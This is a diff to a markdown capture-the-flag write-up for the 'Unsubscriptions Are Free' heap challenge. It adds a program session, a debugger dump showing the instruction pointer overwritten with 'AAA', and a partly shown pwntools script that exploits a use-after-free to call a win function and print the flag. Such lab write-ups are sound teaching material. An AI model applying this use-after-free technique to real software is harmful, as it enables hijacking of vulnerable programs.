@@ -1,5 +1,4 @@
 # Unsubscriptions Are Free
-
 Ths programs starts with this:<br><br>
 ```
 Welcome to my stream! ^W^
@@ -45,7 +44,7 @@ void hahaexploitgobrrr(){
  	fflush(stdout);
 }
 ```
-The function below shows that function that inputs the username
+The function below shows that function that inputs the username.
 <br>
 
 ```c
@@ -80,9 +79,7 @@ char * getsline(void) {
 }
 ```
 <br>
-It shows that the function stores the username dynamically.
-<br>
-The function below handles the deletion of an account
+It shows that the function stores the username dynamically. Furthemore, the function below handles the deletion of an account.
 <br>
 
 ```c
@@ -101,7 +98,7 @@ void i(){
 <br>
 As can be seen from the function above, the function frees the dynamically allocated memory from the heap. This is a potential vulnerability that can be used later on.
 <br>
-The function below is the function for leaving messages. Take note that it also stores text dynamically
+The function below is the function for leaving messages. Take note that it also stores text dynamically.
 <br>
 
 ```c
@@ -178,15 +175,93 @@ $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
 Nothing note worthy. However, freeing a dynamically allocated memory results in a vulnerabiliy, therefore an attempt to create an account and then freeing the account 
 must be inspected.
 <br>
-<img width="472" height="634" alt="image" src="https://github.com/user-attachments/assets/3f7dbdd1-3889-4c5c-8338-4e42225b0812" />
-<br><img width="918" height="589" alt="image" src="https://github.com/user-attachments/assets/aa0b98f8-0b72-48c4-a9e7-a322f1f869bd" />
-<br>
-Take note that the memory address of the function vuln is different than the previous attempt. Additionally, the hexadecimal '414141' corresponds 
-to the ASCII 'AAA' which was the message left earlier. Meaning that changing the return address of the vuln function is possible.
-This can be exploited by changing the address to the hahaexploitgobrrr() function which will result in the function being called 
-in printing the flag.
-This can be done by converting the address of the hahaexploutgobrrr() into ascii/bytes and feeding it into the buffer/message. This can be done using pwntools
 
+```
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+m
+===========================
+Registration: Welcome to Twixer!
+Enter your username: 
+prince
+Account created.
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+i
+You're leaving already(Y/N)?
+y
+Bye!
+Welcome to my stream! ^W^
+==========================
+(S)ubscribe to my channel
+(I)nquire about account deletion
+(M)ake an Twixer account
+(P)ay for premium membership
+(l)eave a message(with or without logging in)
+(e)xit
+l
+I only read premium member messages but you can 
+try anyways:
+AAA
+zsh: segmentation fault  ./chal3
+```
+
+```
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0               
+$rbx   : 0x00007fffffffddf8  →  0x00007fffffffe194  →  "COLORFGBG=15;0"
+$rcx   : 0x000000000042d2bd  →  0x5b77fffff0003d48 ("H="?)
+$rdx   : 0xa414141         
+$rsp   : 0x00007fffffffdbf8  →  0x0000000000401aeb  →  <doProcess+001a> nop 
+$rbp   : 0x00007fffffffdc10  →  0x00007fffffffdc20  →  0x0000000000000001
+$rsi   : 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
+$rdi   : 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
+$rip   : 0xa414141         
+$r8    : 0x0               
+$r9    : 0x00000000004bc500  →  <_IO_2_1_stdin_+0000> mov BYTE PTR [rdx], ah
+$r10   : 0x00000000004be091  →   add BYTE PTR [rax], al
+$r11   : 0x246             
+$r12   : 0x00007fffffffdde8  →  0x00007fffffffe179  →  "/home/john/Downloads/chal3"
+$r13   : 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
+$r14   : 0x1               
+$r15   : 0x1               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffdbf8│+0x0000: 0x0000000000401aeb  →  <doProcess+001a> nop          ← $rsp
+0x00007fffffffdc00│+0x0008: 0x00000000004b8de8  →  0x0000000000401930  →  <frame_dummy+0000> endbr64 
+0x00007fffffffdc08│+0x0010: 0x00000000004c57d0  →  0x000000000a414141 ("AAA\n"?)
+0x00007fffffffdc10│+0x0018: 0x00007fffffffdc20  →  0x0000000000000001    ← $rbp
+0x00007fffffffdc18│+0x0020: 0x0000000000401e38  →  <main+004c> jmp 0x401e15 <main+41>
+0x00007fffffffdc20│+0x0028: 0x0000000000000001
+0x00007fffffffdc28│+0x0030: 0x00000000004022f4  →  <__libc_start_call_main+0064> mov edi, eax
+0x00007fffffffdc30│+0x0038: 0x0000000000401100  →  <_IO_fflush.cold+0000> test DWORD PTR [rbx], 0x8000
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0xa414141
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "chal3", stopped 0xa414141 in ?? (), reason: SIGSEGV
+```
+<br>
+Take note that the memory address of the next function call/return address is different than the previous attempt. Additionally, the hexadecimal '414141' corresponds 
+to the ASCII 'AAA' which was the message left earlier. Meaning there is a possibility of changing the return address of the next function call.
+This can be exploited by changing the address to the hahaexploitgobrrr() function which will result in the function being called and in printing the flag.
+This can be done by converting the address of the hahaexploutgobrrr() into ascii/bytes and feeding it into the buffer/message. This can be done using pwntools. <br><br>
+
+```python
     from pwn import *
     import time
     elf = ELF('./vuln')
@@ -213,17 +288,20 @@ This can be done by converting the address of the hahaexploutgobrrr() into ascii
     p.sendline(payload)
     print(payload)
     p.interactive()
-
+```
 <br>
-p.sendline('s') subscribes to the channel
-p.recvuntil("OOP! Memory leak...") will get the memory leak
-p64(memory_address) converts the memory address into ASCII or bytes
-p.sendline('m') is to make an account
-p.sendline('prince') to name the account 'prince'
-p.sendline('i') to delete the account
-p.sendline('y') to confirm the deletion
-p.sendline('l') to leave a message
-p.sendline(payload) to send the memory address that has been converted to ASCII/bytes
+
+
+p.sendline('s') subscribes to the channel<br>
+p.recvuntil("OOP! Memory leak...") will get the memory leak<br>
+p64(memory_address) converts the memory address into ASCII or bytes<br>
+p.sendline('m') is to make an account<br>
+p.sendline('prince') to name the account 'prince'<br>
+p.sendline('i') to delete the account<br>
+p.sendline('y') to confirm the deletion<br>
+p.sendline('l') to leave a message<br>
+p.sendline(payload) to send the memory address that has been converted to ASCII/bytes<br><br>
+
 
     $ python solve.py  
     [*] '/home/john/practicectf/vuln'
@@ -300,4 +378,4 @@ p.sendline(payload) to send the memory address that has been converted to ASCII/
     (P)ay for premium membership
     (l)eave a message(with or without logging in)
     (e)xit
-The flag has now been outputted
+The flag has now been outputted.
